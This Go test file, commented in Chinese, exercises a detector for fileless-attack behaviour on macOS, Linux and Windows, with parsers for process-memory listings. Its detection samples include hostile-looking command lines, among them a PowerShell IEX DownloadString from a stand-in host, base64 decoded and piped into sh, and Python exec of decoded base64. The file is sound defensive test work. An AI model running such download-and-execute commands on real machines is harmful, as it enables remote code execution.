package collector

// fileless_test.go —— 无文件判定的双向测试。
//
// 八条规则，每条都有「该报」与「不该报」两个样本；三个平台的输入形状
// （vmmap / procfs maps / CIM CSV / PowerShell 命令行）都在本机被真实文本验证。
//
// 反例不是凑数，它们对应真实误报：
//
//	powershell -Encoding utf8          → 前缀与 -enc 相同，最典型的假阳性来源
//	node/chrome 的 256 MiB JIT cage    → 本机 vmmap 实测，判错会把浏览器报成木马
//	base64 -d payload.b64 > out.bin    → 正常解码，不是管道执行
//	python3 -c "print(b64decode(...))" → 正常脚本，不是反射加载

import (
	"context"
	"runtime"
	"strings"
	"testing"
	"time"
)

// hasHit 判定结果里是否含某个 slug。
func hasHit(hits []filelessHit, slug string) bool {
	for _, h := range hits {
		if h.Slug == slug {
			return true
		}
	}
	return false
}

// ---- 规则 1：PowerShell 编码命令 ----

func TestFilelessPSEncoded(t *testing.T) {
	long := strings.Repeat("SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=", 2)
	psExe := `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
	cases := []struct {
		name string
		exe  string
		cmd  string
		hit  bool
	}{
		{"-enc + 长 base64", psExe, `powershell.exe -NoProfile -enc ` + long, true},
		{"-EncodedCommand 全名", psExe, `pwsh -NoProfile -EncodedCommand ` + long, true},
		{"-Encoding utf8 不是编码命令（假阳性来源）", psExe, `powershell.exe -NoProfile -Encoding utf8 -File C:\x.ps1`, false},
		{"-enc 但载荷太短", psExe, `powershell.exe -enc AAAA`, false},
		{"cmd.exe 带 -enc 不算 PowerShell", `C:\Windows\System32\cmd.exe`, `cmd.exe /c something -enc ` + long, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f := filelessFact{Exe: c.exe, Process: baseNameAnyOS(c.exe), Cmdline: c.cmd, PID: 100, HasPID: true}
			hits := judgeFileless(f)
			got := hasHit(hits, flReasonPSEncoded)
			if got != c.hit {
				t.Fatalf("ps-encoded=%v want %v (hits=%+v)", got, c.hit, hits)
			}
			if c.hit {
				// 命中必须是 high：编码命令本身即攻击信号
				for _, h := range hits {
					if h.Slug == flReasonPSEncoded && h.Severity != "high" {
						t.Fatalf("severity=%s want high", h.Severity)
					}
				}
			}
		})
	}
}

// ---- 规则 2：IEX 下载执行 ----

func TestFilelessPSIEX(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		hit  bool
	}{
		{"IEX + DownloadString", `powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://x/a')"`, true},
		{"Invoke-Expression + Invoke-WebRequest", `powershell -Command "Invoke-Expression (Invoke-WebRequest http://x).Content"`, true},
		{"IEX 读本地文件（不是远程取件）", `powershell -c "IEX (Get-Content .\a.ps1 -Raw)"`, false},
		{"只下载不执行", `powershell -c "Invoke-WebRequest http://x -OutFile a.zip"`, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f := filelessFact{Exe: "powershell.exe", Process: "powershell.exe", Cmdline: c.cmd}
			if got := hasHit(judgeFileless(f), flReasonPSIEX); got != c.hit {
				t.Fatalf("ps-iex=%v want %v", got, c.hit)
			}
		})
	}
}

// ---- 规则 3：base64 管道进 shell ----

func TestFilelessB64Pipe(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		exe  string
		hit  bool
	}{
		{"解码后管道给 sh", `/bin/bash -c "echo aGk= | base64 -d | sh"`, "/bin/bash", true},
		{"解码后管道给 python", `bash -c 'cat x | base64 --decode | python3'`, "/bin/bash", true},
		{"解码到文件（正常用法）", `/bin/bash -c "base64 -d payload.b64 > out.bin"`, "/bin/bash", false},
		{"只是普通 base64 编码", `/bin/bash -c "base64 payload.bin > payload.b64"`, "/bin/bash", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f := filelessFact{Exe: c.exe, Process: baseName(c.exe), Cmdline: c.cmd}
			if got := hasHit(judgeFileless(f), flReasonB64Pipe); got != c.hit {
				t.Fatalf("b64-pipe=%v want %v", got, c.hit)
			}
		})
	}
}

// ---- 规则 4：解释器内联解码执行 ----

func TestFilelessInlineDecode(t *testing.T) {
	cases := []struct {
		name string
		exe  string
		cmd  string
		hit  bool
	}{
		{"python -c exec(b64decode)", "/usr/bin/python3", `/usr/bin/python3 -c "import base64;exec(base64.b64decode('cHJpbnQoMSk='))"`, true},
		{"perl -e 解码 eval", "/usr/bin/perl", `/usr/bin/perl -e 'eval(decode_base64("cHJpbnQ="));'`, true},
		{"python 只解码不执行（正常）", "/usr/bin/python3", `/usr/bin/python3 -c "import base64;print(base64.b64decode('aGk='))"`, false},
		{"非解释器带 b64decode 字符串", "/usr/bin/grep", `/usr/bin/grep b64decode file.txt`, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f := filelessFact{Exe: c.exe, Process: baseName(c.exe), Cmdline: c.cmd}
			if got := hasHit(judgeFileless(f), flReasonInline); got != c.hit {
				t.Fatalf("inline-decode=%v want %v", got, c.hit)
			}
		})
	}
}

// ---- 规则 5：memfd ----

func TestFilelessMemfd(t *testing.T) {
	hit := filelessFact{
		Exe: "/usr/bin/x", PID: 5, HasPID: true, MemProbed: true,
		Memfd: []string{"memfd:payload (deleted)"},
	}
	hits := judgeFileless(hit)
	if !hasHit(hits, flReasonMemfd) {
		t.Fatalf("memfd 应命中: %+v", hits)
	}
	for _, h := range hits {
		if h.Slug == flReasonMemfd && h.Kind != EventFilelessMemfd {
			t.Fatalf("kind=%s want %s", h.Kind, EventFilelessMemfd)
		}
	}
	// 反例：没有任何 memfd 映射（普通进程）
	if hasHit(judgeFileless(filelessFact{Exe: "/usr/bin/ls", MemProbed: true}), flReasonMemfd) {
		t.Fatal("普通进程不该报 memfd")
	}
}

// ---- 规则 6：映像已删除 ----

func TestFilelessImageDeleted(t *testing.T) {
	if !hasHit(judgeFileless(filelessFact{Exe: "/tmp/x", ImageDeleted: true, PID: 7, HasPID: true}), flReasonImageGone) {
		t.Fatal("ImageDeleted 应命中")
	}
	// Linux 的 /proc/<pid>/exe 是 "... (deleted)" 结尾，判定也要认
	if !hasHit(judgeFileless(filelessFact{Exe: "/usr/bin/foo (deleted)"}), flReasonImageGone) {
		t.Fatal("exe 尾部 (deleted) 应命中")
	}
	if hasHit(judgeFileless(filelessFact{Exe: "/usr/bin/ls"}), flReasonImageGone) {
		t.Fatal("正常进程不该报映像删除")
	}
}

// ---- 规则 7：匿名可执行段 ----

func TestFilelessAnonExec(t *testing.T) {
	// 该报：临时目录里的进程有 1 MiB 匿名可执行内存
	tmpHit := filelessFact{
		Exe: "/tmp/payload", Process: "payload", ExeInTemp: true, MemProbed: true,
		AnonExecBytes: 1 << 20, AnonExecRegion: 2, PID: 9, HasPID: true,
	}
	if !hasHit(judgeFileless(tmpHit), flReasonAnonExec) {
		t.Fatal("临时目录 + 匿名可执行内存应命中")
	}
	// 该报：映像已删除 + 匿名可执行内存
	delHit := filelessFact{Exe: "/usr/local/bin/x", ImageDeleted: true, MemProbed: true, AnonExecBytes: 2 << 20, AnonExecRegion: 1}
	if !hasHit(judgeFileless(delHit), flReasonAnonExec) {
		t.Fatal("映像已删除 + 匿名可执行内存应命中")
	}
	// 不该报：node 的 JIT cage（本机实测 256 MiB，vmmap 行 rwx/rwx SM=PRV 无路径）
	node := filelessFact{
		Exe: "/Applications/ServBay/package/node/22/bin/node", Process: "node",
		ExeInTemp: true, MemProbed: true, AnonExecBytes: 256 << 20, AnonExecRegion: 1,
	}
	if hasHit(judgeFileless(node), flReasonAnonExec) {
		t.Fatal("Node 的 JIT 内存不该报（白名单失效）")
	}
	// 不该报：有匿名可执行内存但没有任何「不该有」的理由（系统目录里的正常进程）
	plain := filelessFact{Exe: "/usr/bin/foo", MemProbed: true, AnonExecBytes: 8 << 20, AnonExecRegion: 3}
	if hasHit(judgeFileless(plain), flReasonAnonExec) {
		t.Fatal("系统目录进程只有匿名段、无二次信号时不该报")
	}
	// 不该报：没看成内存（MemProbed=false）→ 不能拿 0 当结论，也不能拿残留值当证据
	unprobed := filelessFact{Exe: "/tmp/x", ExeInTemp: true, MemProbed: false, AnonExecBytes: 99 << 20}
	if hasHit(judgeFileless(unprobed), flReasonAnonExec) {
		t.Fatal("没探测过内存时不许报 anon-exec")
	}
	// 不该报：低于下限（256 KiB）
	small := filelessFact{Exe: "/tmp/y", ExeInTemp: true, MemProbed: true, AnonExecBytes: 64 << 10, AnonExecRegion: 1}
	if hasHit(judgeFileless(small), flReasonAnonExec) {
		t.Fatal("低于下限不该报")
	}
}

// ---- 规则 8：临时目录未签名 ----

func TestFilelessUnsignedTemp(t *testing.T) {
	cases := []struct {
		name string
		f    filelessFact
		hit  bool
	}{
		{"临时目录 + 无签名", filelessFact{Exe: "/tmp/a", ExeInTemp: true, HasSigInfo: true, Signed: false}, true},
		{"临时目录 + 有效签名", filelessFact{Exe: "/tmp/a", ExeInTemp: true, HasSigInfo: true, Signed: true}, false},
		{"非临时目录 + 无签名", filelessFact{Exe: "/usr/local/bin/a", HasSigInfo: true, Signed: false}, false},
		{"临时目录但没查签名（不许猜）", filelessFact{Exe: "/tmp/a", ExeInTemp: true, HasSigInfo: false}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := hasHit(judgeFileless(c.f), flReasonUnsigned); got != c.hit {
				t.Fatalf("unsigned-temp=%v want %v", got, c.hit)
			}
		})
	}
}

// ---- 解析：vmmap（真机输出形状） ----

func TestParseVMmapAnonExec(t *testing.T) {
	// 取自本机 `vmmap -pages <node pid>` 的真实行（截断到必要列）
	real := `Process:         node [1287]
VM page size:  16384 bytes

==== Non-writable regions for process 1287
REGION TYPE                    START - END         [   VSIZE    RSDNT    DIRTY     SWAP] PRT/MAX SHRMOD PURGE    REGION DETAIL
__TEXT                      102360000-10748c000    [ 5195      888        0        0   ] r-x/r-x SM=COW          /Applications/ServBay/package/node/22/bin/node
__TEXT                      1937c0000-19380b000    [   18.75    18.75     0        0   ] r-x/r-x SM=COW          /usr/lib/libobjc.A.dylib

==== Writable regions for process 1287
App-Specific Tag 16         10dcc0000-11dcc0000    [16384        0        0        3   ] rwx/rwx SM=PRV
Stack Guard                 169aa0000-16d2a4000    [ 3585        0        0        0   ] ---/rwx SM=NUL          stack guard for thread 0
Malloc Guard Page           10981c000-109820000    [    1        0        0        0   ] ---/rwx SM=SHM
`
	bytes, regions := parseVMmapAnonExec(real)
	wantBytes := int64(16384) * 16384
	if bytes != wantBytes || regions != 1 {
		t.Fatalf("anon exec = %d bytes / %d regions, want %d / 1", bytes, regions, wantBytes)
	}

	// 反例：全是文件后备的进程（bash 的 vmmap）→ 0
	bashLike := `VM page size:  16384 bytes
__TEXT                      104b38000-104bc0000    [   34       27        0        0   ] r-x/r-x SM=COW          /bin/bash
__DATA                      10760c000-107638000    [   11        0        0        7   ] rw-/rw- SM=PRV          /bin/bash
`
	if b, r := parseVMmapAnonExec(bashLike); b != 0 || r != 0 {
		t.Fatalf("文件后备段不该算匿名: %d/%d", b, r)
	}
	// 空输入 / 乱码不许 panic
	if b, _ := parseVMmapAnonExec(""); b != 0 {
		t.Fatal("空输入应返回 0")
	}
	if b, _ := parseVMmapAnonExec("garbage\n[not closed\n"); b != 0 {
		t.Fatal("乱码应返回 0")
	}
}

// ---- 解析：/proc/<pid>/maps ----

func TestParseProcMaps(t *testing.T) {
	maps := `55f0a0000000-55f0a0001000 r--p 00000000 08:01 1234   /usr/bin/bash
55f0a0001000-55f0a0005000 r-xp 00001000 08:01 1234   /usr/bin/bash
7f0a00000000-7f0a00040000 r-xp 00000000 00:00 0
7f0a10000000-7f0a10020000 rwxp 00000000 00:00 0
7f0b00000000-7f0b00010000 r-xp 00000000 00:00 0   /memfd:payload (deleted)
7f1c00000000-7f1c00002000 r-xp 00000000 00:00 0   [vdso]
7ffe00000000-7ffe00021000 rw-p 00000000 00:00 0   [stack]
`
	bytes, regions, memfd := parseProcMaps(maps)
	// 匿名可执行：0x40000 (256 KiB) + 0x20000 (128 KiB) = 384 KiB，2 段
	if bytes != 384*1024 || regions != 2 {
		t.Fatalf("anon exec = %d bytes / %d regions, want %d / 2", bytes, regions, 384*1024)
	}
	if len(memfd) != 1 || !strings.Contains(memfd[0], "memfd:payload") {
		t.Fatalf("memfd=%v", memfd)
	}
	// 反例：普通进程（只有文件后备 + [stack] + [vdso]）
	clean := `55f0a0000000-55f0a0001000 r-xp 00000000 08:01 1234 /usr/bin/ls
7f1c00000000-7f1c00002000 r-xp 00000000 00:00 0  [vdso]
7ffe00000000-7ffe00021000 rw-p 00000000 00:00 0  [stack]
`
	b2, r2, m2 := parseProcMaps(clean)
	if b2 != 0 || r2 != 0 || len(m2) != 0 {
		t.Fatalf("干净进程不该有匿名可执行段: %d/%d/%v", b2, r2, m2)
	}
}

func TestProcExeDeleted(t *testing.T) {
	if !procExeDeleted("/usr/bin/foo (deleted)") {
		t.Fatal("应识别 (deleted)")
	}
	if procExeDeleted("/usr/bin/foo") {
		t.Fatal("正常路径不该判为已删除")
	}
}

// ---- 解析：lsof +L1 ----

func TestParseLsofTxtLinkZero(t *testing.T) {
	// 本机实测输出（删掉 exe 后仍在运行的 Go 进程）
	text := `COMMAND     PID USER   FD   TYPE DEVICE SIZE/OFF NLINK     NODE NAME
af-ghost- 99650  xu.  txt    REG   1,14  1776194     0 12507612 /private/tmp/af-ghost-go2
af-ghost- 99650  xu.  txt    REG   1,14  4146368     - 1152921500 /usr/lib/dyld
`
	got := parseLsofTxtLinkZero(text)
	if len(got) != 1 || got[0] != "/private/tmp/af-ghost-go2" {
		t.Fatalf("paths=%v want [/private/tmp/af-ghost-go2]", got)
	}
	// 反例：只有链接数非 0 的映射（正常进程）
	normal := `COMMAND PID USER FD TYPE DEVICE SIZE/OFF NLINK NODE NAME
bash    123 xu.  txt REG  1,14     2498     1 12345 /bin/bash
`
	if got := parseLsofTxtLinkZero(normal); len(got) != 0 {
		t.Fatalf("不该有结果: %v", got)
	}
}

// ---- 解析：Windows CIM CSV ----

func TestParseCimProcessCSV(t *testing.T) {
	csvText := "\ufeff\"ProcessId\",\"ParentProcessId\",\"Name\",\"ExecutablePath\",\"CommandLine\"\r\n" +
		"\"4321\",\"1000\",\"powershell.exe\",\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\",\"powershell -enc SQBFAFgA,with,commas\"\r\n" +
		"\"4322\",\"4321\",\"evil.exe\",\"C:\\Users\\x\\AppData\\Local\\Temp\\evil.exe\",\"evil.exe --silent\"\r\n"
	facts := parseCimProcessCSV(csvText)
	if len(facts) != 2 {
		t.Fatalf("解析出 %d 条，want 2", len(facts))
	}
	if facts[0].PID != 4321 || facts[0].PPID != 1000 {
		t.Errorf("pid/ppid = %d/%d", facts[0].PID, facts[0].PPID)
	}
	// 命令行里的逗号必须完整保留（手切逗号的实现会在这里断掉）
	if !strings.Contains(facts[0].Cmdline, "SQBFAFgA,with,commas") {
		t.Fatalf("cmdline 被切碎: %q", facts[0].Cmdline)
	}
	if isJITEngine(filelessFact{Exe: `C:\Windows\System32\notepad.exe`}) {
		t.Fatal("notepad 不该被判成 JIT 引擎")
	}
	// 空输入
	if len(parseCimProcessCSV("")) != 0 {
		t.Fatal("空输入应返回空")
	}
}

// ---- 采集器：去重 ----

func newTestFileless() *Fileless {
	fl := &Fileless{seen: map[string]float64{}, limits: "test"}
	fl.Init("fileless", ModePoll, 30*time.Second, func() error { return nil })
	return fl
}

func TestFilelessDedup(t *testing.T) {
	fl := newTestFileless()
	h := filelessHit{Slug: flReasonPSEncoded, Kind: EventFilelessPSEncoded, Severity: "high"}
	key := flKey(filelessFact{PID: 42}, h)
	now := nowSeconds()

	if !fl.flAccept(key, now) {
		t.Fatal("首次应放行")
	}
	if fl.flAccept(key, now+1) {
		t.Fatal("TTL 内第二次必须被吞（否则同一进程每轮刷屏）")
	}
	// TTL 过期后重新放行
	if !fl.flAccept(key, now+flDedupTTL.Seconds()+1) {
		t.Fatal("TTL 过后应重新放行")
	}
	// 不同 pid 是不同键
	if flKey(filelessFact{PID: 43}, h) == key {
		t.Fatal("不同 pid 必须产生不同键")
	}
}

// TestFilelessCollectEndToEnd 走完整 Collector 路径（注入事实 → 判定 → 事件）。
// 这一步覆盖的是「事件字段怎么填」：pid/ppid 指针、subject 里的 reason/note、
// 以及 MemProbed=false 时必须显式写 mem_probed=false（不许让读者以为看过内存）。
func TestFilelessCollectEndToEnd(t *testing.T) {
	fl := newTestFileless()
	fl.factsFn = func(ctx context.Context) ([]filelessFact, error) {
		return []filelessFact{
			{
				Source: "test", PID: 60, PPID: 1, HasPID: true, User: "x",
				Process: "powershell.exe", Exe: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
				Cmdline: "powershell.exe -enc " + strings.Repeat("SQBFAFgA", 12),
			},
			{Source: "test", PID: 61, HasPID: true, Exe: "/usr/bin/ls", Cmdline: "ls -la", MemProbed: true},
			{Source: "test", PID: 62, HasPID: true, Exe: "/tmp/payload", ExeInTemp: true, MemProbed: false, AnonExecBytes: 8 << 20},
		}, nil
	}

	evs, err := fl.Collect(context.Background())
	if err != nil {
		t.Fatalf("Collect 报错: %v", err)
	}
	if len(evs) != 1 {
		t.Fatalf("应只报 1 条（干净进程与未探测内存的进程都不报），得到 %d: %+v", len(evs), evs)
	}
	ev := evs[0]
	if ev.Kind != EventFilelessPSEncoded || ev.Severity != "high" || ev.Source != "fileless" {
		t.Fatalf("事件字段不对: kind=%s sev=%s source=%s", ev.Kind, ev.Severity, ev.Source)
	}
	if ev.PID == nil || *ev.PID != 60 || ev.PPID == nil || *ev.PPID != 1 {
		t.Fatalf("pid/ppid 指针不对: %v/%v", ev.PID, ev.PPID)
	}
	if ev.Subject["reason"] != flReasonPSEncoded || ev.Subject["note"] == "" {
		t.Fatalf("subject 缺 reason/note: %v", ev.Subject)
	}
	if ev.Process != "powershell.exe" {
		t.Fatalf("process=%q（Windows 路径必须按 \\ 切基名）", ev.Process)
	}

	// 第二轮同样事实 → 全被去重吞掉
	evs, err = fl.Collect(context.Background())
	if err != nil || len(evs) != 0 {
		t.Fatalf("第二轮应被去重：%v %v", evs, err)
	}
}

func TestFilelessCollectDedupe(t *testing.T) {
	// 造两条事实：一条命中，一条干净；用 Collector 的判定路径（judgeFileless）
	hit := filelessFact{PID: 50, HasPID: true, Exe: "powershell.exe", Process: "powershell.exe",
		Cmdline: "powershell -enc " + strings.Repeat("A", 80), User: "x"}
	hits := judgeFileless(hit)
	if len(hits) == 0 {
		t.Fatal("样本应命中")
	}
	clean := filelessFact{PID: 51, HasPID: true, Exe: "/usr/bin/ls", Cmdline: "ls -la"}
	if n := len(judgeFileless(clean)); n != 0 {
		t.Fatalf("干净进程不该命中，得到 %d 条", n)
	}
}

// ---- 平台：探测与实测 ----

func TestFilelessProbeAndLimits(t *testing.T) {
	fl := NewFileless(Config{})
	f := fl.(*Fileless)
	if f.Limits() == "" {
		t.Fatal("Limits 不能为空：控制台要展示能力边界")
	}
	if runtime.GOOS == "darwin" {
		if err := platformProbeFileless(); err != nil {
			t.Fatalf("macOS 上 ps 存在，Probe 应为 nil，得到: %v", err)
		}
	}
	if snap := f.Snapshot(); snap["limits"] != f.Limits() {
		t.Fatalf("snapshot.limits=%v", snap["limits"])
	}
}
